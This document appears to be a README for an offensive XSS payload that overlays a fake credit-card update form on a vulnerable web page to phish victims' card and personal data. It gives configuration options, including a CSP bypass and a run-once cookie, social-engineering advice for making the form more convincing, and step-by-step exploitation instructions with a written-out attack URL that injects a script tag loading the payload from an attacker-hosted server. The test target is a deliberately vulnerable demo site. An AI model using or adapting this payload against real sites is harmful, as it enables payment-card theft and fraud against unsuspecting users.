# [unauthn] Credit Card Update Form (Phish)

<p align="justify">This payload adds HTML code as an overlay to the target web page (containing the XSS vulnerability). The code displays a Credit Card Update popup form. If blended in the application's context sufficiently, once they encounter such a prompt, most users have a (proven) tendency to blindly provide it requested information (which contributes to a higher success rate of such phishing attacks).<p>

Typical use-case scenarios:
* external network perspective (Internet)
  * B2C website
    * web shop
    * web support
    * public web
  * **NOTE**: if possible, leverage additional available functionality of the target web application to make the popup form appear (even) more convincing (e.g. using JavaScript, open the chat widget and display an appropriate phishing message to the victim user and display the form afterwards)

The payload (`ccphish.js`) supports the following options:

* no CSP bypass - issue AJAX request (i.e. client-side redirect)

  ```
  ...
  let bypassCSP = false;
  ...
  ```

* CSP bypass - issue hard redirect (uses `redir.php`; i.e. server-side redirect)

  ```
  ...
  let bypassCSP = true;
  ...
  ```

* run payload once - sets a cookie, once payload is executed; used to prevent further payload executions

  ```
  ...
  let runOnce = true;
  ...
  ```

## Test Environment

### Web Browsers (20250806)

* [x] Mozilla Firefox 141.0.2 (64-bit)
* [x] Google Chrome 139.0.7258.67 (64-bit)
* [x] Microsoft Edge 138.0.3351.121 (64-bit)

### Vulnerable Page

http://testphp.vulnweb.com/listproducts.php?cat=XSS_PAYLOAD_HERE

## Exploitation Steps

1. [setup exploit] adapt to target environment

    * change logo (image + displayed dimensions)
    * modify CSS (scenario-dependent)

3. [setup exploit] change payload variable values (`ccphish.js`; `redir.php`)

    `attWsPhishPath` - exfiltration web server URL (i.e. scheme + FQDN + port + path; use trailing slash)

    `bypassCSP` - use/do not use CSP bypass (true/false)

    `runOnce` - execute payload only once (true/false)

    `url` - exfiltration web server URL

4. [setup exploit] setup web server (to serve the payload/redirector)

5. [social engineering attack] victim user clicks link

    ```
    http://testphp.vulnweb.com/listproducts.php?cat=<script src=http://192.168.5.5/ccphish.js></script>
    ```

    * **NOTES**:
      * `testphp.vulnweb.com` - target site
      * `192.168.5.5` - web server hosting the payload

6. [social engineering attack] victim user provides requested information

    *(attacker obtains PII data)*

7. [post exploit] attacker leverages obtained PII data

## Screenshots

* **NOTE**: the screenshot covers steps 2 to 5 from the "Exploitation Steps" chapter

<p align="center">
  <kbd>
    <picture>
      <source media="" srcset="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/CredCardPhishing/screenshots/CredCard_phish_-_PII_exfil_-_1-1.png">
      <img src="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/CredCardPhishing/screenshots/CredCard_phish_-_PII_exfil_-_1-1.png">
    </picture>
  </kbd>
</p>

* [web browser rendering] Mozilla FireFox

<p align="center">
  <kbd>
    <picture>
      <source media="" srcset="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/CredCardPhishing/screenshots/CredCard_phish_-_web_browser_rendering_-_Mozilla_FireFox_-_1-1.png">
      <img src="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/CredCardPhishing/screenshots/CredCard_phish_-_web_browser_rendering_-_Mozilla_FireFox_-_1-1.png">
    </picture>
  </kbd>
</p>

* [web browser rendering] Google Chrome

<p align="center">
  <kbd>
    <picture>
      <source media="" srcset="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/CredCardPhishing/screenshots/CredCard_phish_-_web_browser_rendering_-_Google_Chrome_-_1-1.png">
      <img src="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/CredCardPhishing/screenshots/CredCard_phish_-_web_browser_rendering_-_Google_Chrome_-_1-1.png">
    </picture>
  </kbd>
</p>

* [web browser rendering] Microsoft Edge

<p align="center">
  <kbd>
    <picture>
      <source media="" srcset="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/CredCardPhishing/screenshots/CredCard_phish_-_web_browser_rendering_-_Microsoft_Edge_-_1-1.png">
      <img src="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/CredCardPhishing/screenshots/CredCard_phish_-_web_browser_rendering_-_Microsoft_Edge_-_1-1.png">
    </picture>
  </kbd>
</p>

## Video

https://github.com/user-attachments/assets/8d47b495-6fef-4059-b3dc-aaa31655a748
